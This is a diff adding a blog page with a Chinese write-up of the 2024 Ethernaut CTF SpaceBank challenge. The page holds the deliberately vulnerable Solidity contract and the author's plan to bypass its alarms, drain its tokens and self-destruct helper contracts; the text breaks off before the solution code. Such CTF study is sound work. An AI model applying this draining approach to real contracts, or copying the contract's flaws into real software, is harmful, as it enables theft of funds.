@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="f4tb3e">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/03/20/2024ethernautctf/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="2024年Ethernaut CTF 零星几题（SpaceBank）的复现，未完结。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 Ethernaut CTF 部分Write-up">
+<meta property="og:url" content="http://example.com/2024/03/20/2024EthernautCTF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="2024年Ethernaut CTF 零星几题（SpaceBank）的复现，未完结。。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-19T22:03:00.000Z">
+<meta property="article:modified_time" content="2024-03-19T22:03:25.895Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="solidity">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061857527.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2024 Ethernaut CTF 部分Write-up -
+        
+        f4tb3e&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        f4tb3e&#39;s Blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Here is f4tb3e!","subtitle":{"text":["My dad has a GT-R!","Dude, is that a Supra?","夏树，叔叔要加速咯"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":80,"backing_speed":60,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/6 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://cdn.jsdelivr.net/gh/f4tb3e/AutoUploadPics/img/202311061840946.gif">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                f4tb3e&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202403200447112.png" alt="2024 Ethernaut CTF 部分Write-up" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">2024 Ethernaut CTF 部分Write-up</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202305191441958.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">f4tb3e</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-03-20 06:03</span>
+        <span class="mobile">2024-03-20 06:03</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-20 06:03:25</span>
+            <span class="mobile">2024-03-20 06:03:25</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/solidity/">solidity</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="SpaceBank"><a href="#SpaceBank" class="headerlink" title="SpaceBank"></a>SpaceBank</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.9;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin/access/Ownable.sol&quot;;</span><br><span class="line">import &quot;openzeppelin/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanReceiver &#123;</span><br><span class="line">    function executeFlashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SpaceBank &#123;</span><br><span class="line">    //Number of alarm activations</span><br><span class="line">    uint256 EmergencyAlarms;</span><br><span class="line">    //Token of the bank</span><br><span class="line">    IERC20 public token;</span><br><span class="line">    //Depositor balances</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line">    //reentrancy protection</span><br><span class="line">    bool entered;</span><br><span class="line"></span><br><span class="line">    uint256 internal gasLimit0 = 9999999999999999999999999; //@TODO calculate these gas limit values to be as small as possible</span><br><span class="line"></span><br><span class="line">    uint256 internal gasLimit1 = 9999999999999999999999999;</span><br><span class="line"></span><br><span class="line">    address internal _createdAddress;</span><br><span class="line"></span><br><span class="line">    uint256 alarmTime;</span><br><span class="line"></span><br><span class="line">    bool public exploded;</span><br><span class="line"></span><br><span class="line">    bool locked; //If this is true the bank will be locked forever.</span><br><span class="line"></span><br><span class="line">    modifier _emergencyAlarms(bytes calldata data) &#123;</span><br><span class="line">        if (entered = true) &#123;</span><br><span class="line">            EmergencyAlarms++; //Sound the alarm and activate the security protocol</span><br><span class="line">            _emergencyAlarmProtocol(data);</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _token) &#123;</span><br><span class="line">        token = IERC20(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gasLimits() internal view returns (uint256) &#123;</span><br><span class="line">        if (EmergencyAlarms == 1) return gasLimit0;</span><br><span class="line">        if (EmergencyAlarms == 2) return gasLimit1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Deposit into the bank</span><br><span class="line">    function deposit(uint256 amount, bytes calldata data) external _emergencyAlarms(data) &#123;</span><br><span class="line">        require(token.transferFrom(msg.sender, address(this), amount), &quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Withdraws from the bank</span><br><span class="line">    function withdraw(uint256 amount) external &#123; </span><br><span class="line">        require(balances[msg.sender] &gt;= amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        require(token.transfer(msg.sender, amount), &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Takes a flashloan from the bank</span><br><span class="line">    function flashLoan(uint256 amount, address flashLoanReceiver) external &#123;</span><br><span class="line">        uint256 initialBalance = token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        require(initialBalance &gt;= amount, &quot;Not enough liquidity&quot;);</span><br><span class="line">        // Transfer loan amount to the receiver</span><br><span class="line">        require(token.transfer(flashLoanReceiver, amount), &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">        // Execute custom logic in the receiver&#x27;s contract</span><br><span class="line">        entered = true;</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory result) =</span><br><span class="line">            flashLoanReceiver.call(abi.encodeWithSignature(&quot;executeFlashLoan(uint256)&quot;, amount));</span><br><span class="line">        if (success == false) revert(string(result));</span><br><span class="line">        entered = false;</span><br><span class="line">        uint256 fee = amount / 1000; // 0.1% fee</span><br><span class="line">        uint256 currentBalance = token.balanceOf(address(this));</span><br><span class="line">        require(currentBalance &gt;= initialBalance + fee, &quot;Loan not repaid with fee&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //Alarms will be activated to protect from thiefs</span><br><span class="line">    function _emergencyAlarmProtocol(bytes memory data) internal &#123;</span><br><span class="line">        if (EmergencyAlarms == 1) &#123;</span><br><span class="line">            //first alarm</span><br><span class="line">            uint256 MagicNumber = block.number;</span><br><span class="line"></span><br><span class="line">            uint256 x = abi.decode(data, (uint256));</span><br><span class="line">            require(x == MagicNumber % 47, &quot;Wrong passphrase&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if (EmergencyAlarms == 2) &#123;</span><br><span class="line">            //second alarm</span><br><span class="line">            bytes32 MagicNumber = bytes32(block.number);</span><br><span class="line">            uint256 balance = address(this).balance;</span><br><span class="line">            address newContractAddress;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                newContractAddress := create2(0, add(data, 0x20), mload(data), MagicNumber)</span><br><span class="line">            &#125;</span><br><span class="line">            require(address(this).balance &gt; balance, &quot;You need to send ether to pass through security&quot;);</span><br><span class="line">            _createdAddress = newContractAddress;</span><br><span class="line">            alarmTime = block.number;</span><br><span class="line">        &#125;</span><br><span class="line">        if (EmergencyAlarms == 3) &#123;</span><br><span class="line">            revert(&quot;Third alarm, bank is locked&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ///Make the bank explode</span><br><span class="line">    function explodeSpaceBank() external &#123;</span><br><span class="line">        require(block.number == alarmTime + 2, &quot;Can&#x27;t explode the bank&quot;);</span><br><span class="line">        uint256 codeSize;</span><br><span class="line">        address value = _createdAddress;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            codeSize := extcodesize(value)</span><br><span class="line">        &#125;</span><br><span class="line">        require(codeSize == 0, &quot;You were caught&quot;);</span><br><span class="line">        require(token.balanceOf(address(this)) == 0, &quot;The bank still has funds&quot;);</span><br><span class="line">        exploded = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SpaceToken is ERC20, Ownable &#123;</span><br><span class="line">    constructor() ERC20(&quot;SpaceToken&quot;, &quot;Space&quot;) Ownable(msg.sender) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) public onlyOwner &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>The formidable Space Bank is known for its stringent security systems and vast reserves of space tokens (Galactic credits). Outsmart two state-of-the-art alarms, steal the tokens, and then detonate the bank to claim victory.</p>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目的要求是绕过两个警报，然后掏空银行中的代币，最后炸掉银行。如果要炸银行，那么前两个步骤是必须要做的，算是提示了一番。</p>
+<p>我们从最终目标<code>explodeSpaceBank()</code>函数入手，其中有三个断言：</p>
+<ul>
+<li>区块号必须满足<code>alarmTime + 2</code>的要求</li>
+<li>某个合约的<code>codesize</code>必须为 0</li>
+<li>银行中的代币必须掏干净，一个也不能剩</li>
+</ul>
+<p>前两个断言暂时比较模糊，但是最后一个偷光代币的要求还是很明确的，我们查看前两个断言，变量都指向了<code>_emergencyAlarmProtocol</code>函数，这个函数实现了警报的功能，会在银行的<code>deposit()</code>函数被调用时由<code>_emergencyAlarms</code>修改器调用。不难看出，往这个函数里传入正确的<code>data</code>参数可以绕过警报而不被回滚。</p>
+<p>第一次警报的绕过十分简单，只需要简单的计算：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = abi.encode((block.number) % 47)</span><br></pre></td></tr></table></figure></div>
+
+<p>第二次警报需要我们传入一个合约的字节码供其部署，部署完成以后立即执行一个断言，判断其 ETH 余额相较于部署前是否增加，换言之，我们需要在被部署合约的构造函数中完成向银行合约（无 fallback 函数）转账，以及自毁的（回想<code>explodeSpaceBank()</code>的第二个断言）功能。对此，我的解决方案如下：部署 B合约的同时给它转入 ETH，其<code>pay()</code>函数实现自毁并（余额转到银行）；编写 A合约，实现在构造过程中调用 B合约的<code>pay()</code>函数并自毁，将 A合约的字节码传入<code>_emergencyAlarmProtocol</code>即可。这样就解决了难以向由银行部署的 A合约进行转账的痛点。如下代码，A合约代表 Middle，B合约代表 Payer。</p>
